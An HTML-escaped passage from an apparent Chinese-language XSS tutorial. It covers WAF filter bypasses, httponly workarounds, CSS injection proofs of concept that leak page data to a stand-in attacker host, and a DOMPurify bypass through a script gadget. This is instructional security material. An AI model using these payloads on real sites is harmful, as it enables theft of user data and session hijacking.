&lt;li&gt;ALLOW-FROM
&lt;ul&gt;
&lt;li&gt;页面允许 frame 或 frame 加载&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;xss保护头&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xss保护头&#34;&gt;#&lt;/a&gt; XSS 保护头&lt;/h2&gt;
&lt;p&gt;基于 Webkit 内核的浏览器 (比如 Chrome) 在特定版本范围内有一个名为 XSS auditor 的防护机制，如果浏览器检测到了含有恶意代码的输入被呈现在 HTML 文档中，那么这段呈现的恶意代码要么被删除，要么被转义，恶意代码不会被正常的渲染出来。&lt;/p&gt;
&lt;p&gt;而浏览器是否要拦截这段恶意代码取决于浏览器的 XSS 防护设置。&lt;/p&gt;
&lt;p&gt;要设置浏览器的防护机制，则可使用 X-XSS-Protection 字段 该字段有三个可选的值&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;0&lt;/code&gt;  : 表示关闭浏览器的 XSS 防护机制&lt;/li&gt;
&lt;li&gt;&lt;code&gt;1&lt;/code&gt;  : 删除检测到的恶意代码， 如果响应报文中没有看到 X-XSS-Protection 字段，那么浏览器就认为 X-XSS-Protection 配置为 1，这是浏览器的默认设置&lt;/li&gt;
&lt;li&gt;&lt;code&gt;1; mode=block&lt;/code&gt;  : 如果检测到恶意代码，在不渲染恶意代码&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;FireFox 没有相关的保护机制，如果需要保护，可使用 NoScript 等相关插件。&lt;/p&gt;
&lt;h1 id=&#34;waf-bypass&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#waf-bypass&#34;&gt;#&lt;/a&gt; WAF Bypass&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;利用 &amp;lt;&amp;gt; 标记&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;利用 html 属性&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;href&lt;/li&gt;
&lt;li&gt;lowsrc&lt;/li&gt;
&lt;li&gt;bgsound&lt;/li&gt;
&lt;li&gt;background&lt;/li&gt;
&lt;li&gt;value&lt;/li&gt;
&lt;li&gt;action&lt;/li&gt;
&lt;li&gt;dynsrc&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;关键字&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;利用回车拆分&lt;/li&gt;
&lt;li&gt;字符串拼接
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;window[&amp;quot;al&amp;quot; + &amp;quot;ert&amp;quot;]&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;利用编码绕过&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;base64&lt;/li&gt;
&lt;li&gt;jsfuck&lt;/li&gt;
&lt;li&gt;String.fromCharCode&lt;/li&gt;
&lt;li&gt;HTML&lt;/li&gt;
&lt;li&gt;URL&lt;/li&gt;
&lt;li&gt;hex
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;window[&amp;quot;\x61\x6c\x65\x72\x74&amp;quot;]&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;unicode&lt;/li&gt;
&lt;li&gt;utf7
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;+ADw-script+AD4-alert(&#39;XSS&#39;)+ADsAPA-/script+AD4-&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;utf16&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;大小写混淆&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;对标签属性值转码&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;产生事件&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;css 跨站解析&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;长度限制 bypass&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;eval(name)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;eval(hash)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;import&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;$.getScript&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;$.get&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;.&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使用  &lt;code&gt;。&lt;/code&gt;  绕过 IP / 域名&lt;/li&gt;
&lt;li&gt;&lt;code&gt;document[&#39;cookie&#39;]&lt;/code&gt;  绕过属性取值&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;过滤引号用  &lt;code&gt;`&lt;/code&gt;  绕过&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;技巧&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#技巧&#34;&gt;#&lt;/a&gt; 技巧&lt;/h1&gt;
&lt;h2 id=&#34;httponly&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#httponly&#34;&gt;#&lt;/a&gt; httponly&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;在 cookie 为 httponly 的情况下，可以通过 xss 直接在源站完成操作，不直接获取 cookie。&lt;/li&gt;
&lt;li&gt;在有登录操作的情况下，部分站点直接发送登录请求可能会带有 cookie&lt;/li&gt;
&lt;li&gt;部分特定版本的浏览器可能会在 httponly 支持 / 处理上存在问题&lt;/li&gt;
&lt;li&gt;低版本浏览器支持 TRACE / TRACK，可获取敏感的 header 字段&lt;/li&gt;
&lt;li&gt;phpinfo 等页面可能会回显信息，这些信息中包含 http 头&lt;/li&gt;
&lt;li&gt;通过 xss 劫持页面钓鱼&lt;/li&gt;
&lt;li&gt;通过 xss 伪造 oauth 等授权请求，远程登录&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;css注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#css注入&#34;&gt;#&lt;/a&gt; CSS 注入&lt;/h2&gt;
&lt;h3 id=&#34;基本介绍&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#基本介绍&#34;&gt;#&lt;/a&gt; 基本介绍&lt;/h3&gt;
&lt;p&gt;CSS 注入最早开始于利用 CSS 中的  &lt;code&gt;expression()&lt;/code&gt;   &lt;code&gt;url()&lt;/code&gt;   &lt;code&gt;regex()&lt;/code&gt;  等函数或特性来引入外部的恶意代码，但是随着浏览器的发展，这种方式被逐渐禁用，与此同时，出现了一些新的攻击方式。&lt;/p&gt;
&lt;h3 id=&#34;css-selectors&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#css-selectors&#34;&gt;#&lt;/a&gt; CSS selectors&lt;/h3&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption data-lang=&#34;HTML&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;style&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token style&#34;&gt;&lt;span class=&#34;token language-css&#34;&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token selector&#34;&gt;#form2 input[value^=&#39;a&#39;]&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt; &lt;span class=&#34;token property&#34;&gt;background-image&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token url&#34;&gt;&lt;span class=&#34;token function&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;http://localhost/log.php/a&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token selector&#34;&gt;#form2 input[value^=&#39;b&#39;]&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt; &lt;span class=&#34;token property&#34;&gt;background-image&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token url&#34;&gt;&lt;span class=&#34;token function&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;http://localhost/log.php/b&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token selector&#34;&gt;#form2 input[value^=&#39;c&#39;]&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt; &lt;span class=&#34;token property&#34;&gt;background-image&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token url&#34;&gt;&lt;span class=&#34;token function&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;http://localhost/log.php/c&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    [...]&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;style&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;form&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;action&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;http://example.com&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;form2&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;input&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;text&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;secret&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;secret&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;abc&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;form&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;上图是利用 CSS selectors 完成攻击的一个示例&lt;/p&gt;
&lt;h3 id=&#34;abusing-unicode-range&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#abusing-unicode-range&#34;&gt;#&lt;/a&gt; Abusing Unicode Range&lt;/h3&gt;
&lt;p&gt;当可以插入 CSS 的时候，可以使用  &lt;code&gt;font-face&lt;/code&gt;  配合  &lt;code&gt;unicode-range&lt;/code&gt;  获取目标网页对应字符集。PoC 如下&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption data-lang=&#34;HTML&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;style&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token style&#34;&gt;&lt;span class=&#34;token language-css&#34;&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token atrule&#34;&gt;&lt;span class=&#34;token rule&#34;&gt;@font-face&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token property&#34;&gt;font-family&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;poc&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token property&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token url&#34;&gt;&lt;span class=&#34;token function&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;http://attacker.example.com/?A&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;/* fetched */&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token property&#34;&gt;unicode-range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;U+0041&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token atrule&#34;&gt;&lt;span class=&#34;token rule&#34;&gt;@font-face&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token property&#34;&gt;font-family&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;poc&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token property&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token url&#34;&gt;&lt;span class=&#34;token function&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;http://attacker.example.com/?B&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;/* fetched too */&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token property&#34;&gt;unicode-range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;U+0042&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token atrule&#34;&gt;&lt;span class=&#34;token rule&#34;&gt;@font-face&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token property&#34;&gt;font-family&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;poc&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token property&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token url&#34;&gt;&lt;span class=&#34;token function&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;http://attacker.example.com/?C&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;/* not fetched */&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token property&#34;&gt;unicode-range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;U+0043&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token selector&#34;&gt;#sensitive-information&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token property&#34;&gt;font-family&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;poc&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;style&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;p&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;sensitive-information&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;AB&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;p&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;当字符较多时，则可以结合  &lt;code&gt;::first-line&lt;/code&gt;  等 CSS 属性缩小范围，以获取更精确的内容&lt;/p&gt;
&lt;h2 id=&#34;bypass-via-script-gadgets&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#bypass-via-script-gadgets&#34;&gt;#&lt;/a&gt; Bypass Via Script Gadgets&lt;/h2&gt;
&lt;h3 id=&#34;简介-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介-3&#34;&gt;#&lt;/a&gt; 简介&lt;/h3&gt;
&lt;p&gt;一些网站会使用白名单或者一些基于 DOM 的防御方式，对这些方式，有一种被称为  &lt;code&gt;Code Reuse&lt;/code&gt;  的攻击方式可以绕过。该方式和二进制攻防中的 Gadget 相似，使用目标中的合法代码来达到绕过防御措施的目的。在论文  &lt;code&gt;Code-Reuse Attacks for the Web: Breaking Cross-Site Scripting Mitigations via Script Gadgets&lt;/code&gt;  中有该方法的具体描述。&lt;/p&gt;
&lt;p&gt;portswigger 的一篇博文也表达了类似的想法  &lt;code&gt;https://portswigger.net/blog/abusing-javascript-frameworks-to-bypass-xss-mitigations&lt;/code&gt; 。&lt;/p&gt;
&lt;p&gt;下面有一个简单的例子，这个例子使用了  &lt;code&gt;DOMPurify&lt;/code&gt;  来加固，但是因为引入了  &lt;code&gt;jquery.mobile.js&lt;/code&gt;  导致可以被攻击。&lt;/p&gt;
&lt;h3 id=&#34;例子&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#例子&#34;&gt;#&lt;/a&gt; 例子&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-php+HTML&#34;&gt;// index.php
&amp;lt;?php

$msg = $_GET[&#39;message&#39;];
$msg = str_replace(&amp;quot;\n&amp;quot;, &amp;quot;&amp;quot;, $msg);
$msg = base64_encode($msg);

?&amp;gt;

&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt;
    &amp;lt;title&amp;gt;Preview&amp;lt;/title&amp;gt;
    &amp;lt;script type=&amp;quot;text/javascript&amp;quot; src=&amp;quot;purify.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
    &amp;lt;script type=&amp;quot;text/javascript&amp;quot; src=&amp;quot;jquery.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
    &amp;lt;script type=&amp;quot;text/javascript&amp;quot; src=&amp;quot;jquery.mobile.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;

    &amp;lt;script type=&amp;quot;text/javascript&amp;quot;&amp;gt;
    var d= atob(&#39;&amp;lt;?php echo $msg; ?&amp;gt;&#39;);
    var cleanvar = DOMPurify.sanitize(d);
    document.write(cleanvar);
    &amp;lt;/script&amp;gt;

&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
// payload
&amp;lt;div data-role=popup id=&#39;--&amp;gt;
&amp;amp;lt;script&amp;amp;gt;alert(1)&amp;amp;lt;/script&amp;amp;gt;&#39;&amp;gt;
&amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;rporelative-path-overwrite&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#rporelative-path-overwrite&#34;&gt;#&lt;/a&gt; RPO(Relative Path Overwrite)&lt;/h2&gt;
&lt;p&gt;RPO (Relative Path Overwrite) 攻击又称为相对路径覆盖攻击，依赖于浏览器和网络服务器的反应，利用服务器的 Web 缓存技术和配置差异。&lt;/p&gt;
&lt;h1 id=&#34;payload&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#payload&#34;&gt;#&lt;/a&gt; Payload&lt;/h1&gt;
&lt;h2 id=&#34;常用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常用&#34;&gt;#&lt;/a&gt; 常用&lt;/h2&gt;
&lt;ul&gt;
